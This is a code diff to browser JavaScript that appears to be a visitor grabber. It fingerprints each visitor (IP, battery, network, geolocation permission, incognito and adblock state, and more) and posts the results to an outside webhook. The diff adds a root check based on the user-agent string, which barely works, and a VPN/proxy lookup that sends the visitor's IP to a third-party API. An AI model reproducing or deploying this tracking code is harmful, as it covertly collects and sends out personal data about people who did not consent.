@@ -57,7 +57,7 @@
                     if (perm.state === "granted") {
                         geo = "Available";
                     } else {
-                        geo = "Permission required"; 
+                        geo = "Permission required";
                     }
                 }
 
@@ -105,13 +105,29 @@
                     dsm = "On";
                 }
 
+                let rt = "Off";
+                if (/Android/i.test(ua) && /root/i.test(ua)) {
+                    rt = "On";
+                } else if (/Linux/i.test(ua) && /sudo|root/i.test(ua)) {
+                    rt = "On";
+                }
+
+                let vp = "Off";
+                try {
+                    const vpnCheck = await fetch("https://api.ipapi.is/?ip=" + ip);
+                    const vpnData = await vpnCheck.json();
+                    if (vpnData.is_proxy || vpnData.is_vpn) vp = "On";
+                } catch {
+                    vp = "Unknown";
+                }
+
                 await fetch(whUrl, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        content: `IP Address: ${ip}\nBrowser Language: ${lang}\nConnection Type: ${ct}\nNetwork Type: ${nt}\nDownlink Speed: ${ds}\nBattery Level: ${bl}\nCharging Status: ${cs}\nPower Save Mode: ${psm}\nPlatform: ${plat}\nBrowser: ${br}\nGeolocation: ${geo}\nScreen Resolution: ${sr}\nLocal Time: ${lt}\nCPU Cores: ${cc}\nDo Not Track: ${dnt}\nDuration Active: ${dt}\nTheme: ${theme}\nNotification Permission: ${np}\nIn-App Browser: ${bt}\nAdblock: ${ab}\nIncognito Mode: ${inc}\nDesktop Mode: ${dm}\nData Saver Mode: ${dsm}`
+                        content: `IP Address: ${ip}\nBrowser Language: ${lang}\nConnection Type: ${ct}\nNetwork Type: ${nt}\nDownlink Speed: ${ds}\nBattery Level: ${bl}\nCharging Status: ${cs}\nPower Save Mode: ${psm}\nPlatform: ${plat}\nBrowser: ${br}\nGeolocation: ${geo}\nScreen Resolution: ${sr}\nLocal Time: ${lt}\nCPU Cores: ${cc}\nDo Not Track: ${dnt}\nDuration Active: ${dt}\nTheme: ${theme}\nNotification Permission: ${np}\nIn-App Browser: ${bt}\nAdblock: ${ab}\nIncognito Mode: ${inc}\nDesktop Mode: ${dm}\nData Saver Mode: ${dsm}\nRoot User: ${rt}\nVPN/Proxy: ${vp}`
                     })
                 });
 
